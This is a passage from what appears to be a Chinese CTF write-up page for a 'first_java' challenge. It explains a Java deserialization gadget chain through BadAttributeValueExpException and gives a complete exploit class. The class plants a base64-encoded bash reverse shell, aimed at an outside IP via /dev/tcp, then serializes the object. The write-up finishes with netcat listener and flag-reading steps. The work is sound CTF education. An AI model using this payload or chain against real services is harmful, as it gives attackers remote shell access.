+<p>&#x8FD9;&#x91CC;&#x663E;&#x7136;&#x5C31;&#x662F;User&#x7684;toString&#x65B9;&#x6CD5;&#x5230;eval&#x65B9;&#x6CD5;&#x518D;&#x5230;exec&#x7C7B;&#x4E2D;&#x7684;runcmd&#x65B9;&#x6CD5;&#x3002;&#xFF08;&#x4E3A;&#x4EC0;&#x4E48;&#x8BF4;&#x662F;first_java&#x5C31;&#x662F;&#x56E0;&#x4E3A;&#x8FD9;&#x91CC;&#x4E0D;&#x7528;&#x8FFD;&#x8C03;&#x7528;&#x94FE;&#xFF0C;&#x4F1A;java&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5C31;&#x51FA;&#x4E86;&#xFF09;&#x800C;toString&#x65B9;&#x6CD5;&#x600E;&#x4E48;&#x89E6;&#x53D1;&#xFF0C;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#x4E00;&#x641C;&#x5C31;&#x80FD;&#x641C;&#x5230;&#x3002;&#x5373;BadAttributeValueExpException &#x7C7B;&#x3002;&#xFF08;BadAttributeValueExpException&#xFF1A;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x53BB;&#x8C03;&#x7528;&#x6210;&#x5458;&#x53D8;&#x91CF;val&#x7684;toString&#x51FD;&#x6570;&#xFF09;
+&#x7EFC;&#x4E0A;&#xFF0C;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x6784;&#x9020;&#x4E00;&#x4E2A;BadAttributeValueExpException &#x7C7B;&#x5BF9;&#x8C61;&#xFF0C;&#x628A;&#x5176;&#x6210;&#x5458;&#x53D8;&#x91CF;val&#x8D4B;&#x4E3A;User&#x7C7B;&#x5BF9;&#x8C61;&#xFF0C;&#x5176;&#x4E2D;User&#x5BF9;&#x8C61;&#x7684;name&#x6210;&#x5458;&#x53D8;&#x91CF;&#x4E3A;&#x8981;&#x6267;&#x884C;&#x7684;&#x547D;&#x4EE4;&#x3002;&#xFF08;&#x8FD9;&#x91CC;&#x7531;&#x4E8E;&#x65E0;&#x56DE;&#x663E;&#x6240;&#x4EE5;&#x7528;&#x4E00;&#x4E2A;&#x53CD;&#x5F39;shell&#x7684;&#x6280;&#x5DE7;&#xFF09;</p>
+<p>&#x5173;&#x4E8E;java&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x94FE;&#x7684;&#x6784;&#x9020;&#x53EF;&#x4EE5;&#x5148;&#x4E86;&#x89E3;Java&#x53CD;&#x5C04;&#x3001;&#x770B;readObject()&#x65B9;&#x6CD5;&#x7B49;&#x7B49;&#x3002;&#x518D;&#x4E0D;&#x4F1A;&#x76F4;&#x63A5;QQ&#x627E;1manity&#xFF0C;&#x6211;&#x624B;&#x628A;&#x624B;&#x6559;~~</p>
+<p>&#x4E0B;&#x9762;&#x7ED9;&#x51FA;exp</p>
+<pre><code class="lang-java"><span class="hljs-keyword">package</span> com.example.demo;
+
+<span class="hljs-keyword">import</span> com.example.demo.classes.User;
+<span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;
+<span class="hljs-keyword">import</span> java.io.*;
+<span class="hljs-keyword">import</span> java.lang.reflect.Constructor;
+<span class="hljs-keyword">import</span> java.lang.reflect.Field;
+<span class="hljs-keyword">import</span> java.util.Base64;
+
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp</span> </span>{
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>{
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(<span class="hljs-keyword">true</span>);
+        field.set(obj, value);
+    }
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{
+
+        Class c=Class.forName(<span class="hljs-string">&quot;com.example.demo.classes.User&quot;</span>);
+        Constructor con=c.getDeclaredConstructor();
+        con.setAccessible(<span class="hljs-keyword">true</span>);
+        Object u=con.newInstance();
+
+        setFieldValue(u,<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDMuMTIyLjIyMS8zMzQ1NyAwPiYx}|{base64,-d}|{bash,-i}&quot;</span>);
+
+        BadAttributeValueExpException val1 = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-keyword">null</span>);
+        setFieldValue(val1,<span class="hljs-string">&quot;val&quot;</span>,u);
+        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
+        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);
+        oos.writeObject(val1);
+        System.out.println(Base64.getEncoder().encodeToString(barr.toByteArray()));
+    }
+}
+</code></pre>
+<p>&#x5728;&#x81EA;&#x5DF1;&#x7684;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x8D77;nc -lvp 33452&#xFF0C;&#x63D0;&#x4EA4;payload</p>
+<p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x8FDE;&#x63A5;&#x5230;&#x76EE;&#x6807;&#x673A;&#x4E86;~ cat /flag&#x5C31;&#x597D;&#x4E86;~</p>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <!-- <a href="JS 的一些特性：原型链，作用域，闭包.html#20230117" class="navigation navigation-prev navigation-unique" aria-label="Previous page: JS 的一些特性：原型链，作用域，闭包">
+                    <i class="fa fa-angle-left"></i>
+                </a> -->
+                
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"CBCTF-0RAYS协会招新","level":"1.6","depth":1,"previous":{"title":"JS 的一些特性：原型链，作用域，闭包","level":"1.5","depth":1,"anchor":"#20230117","path":"JS 的一些特性：原型链，作用域，闭包.md","ref":"JS 的一些特性：原型链，作用域，闭包.md#20230117","articles":[]},"dir":"ltr"},"config":{"plugins":[],"root":"./pages","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"fontsettings":{"theme":"night","family":"serif","size":2},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"gitbook":"*"},"file":{"path":"CBCTF-0RAYS协会招新.md","mtime":"2023-08-23T07:54:55.649Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-08-23T08:30:37.631Z"},"basePath":".","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="gitbook/gitbook.js"></script>
+    <script src="gitbook/theme.js"></script>
+    
+        
+        <script src="gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
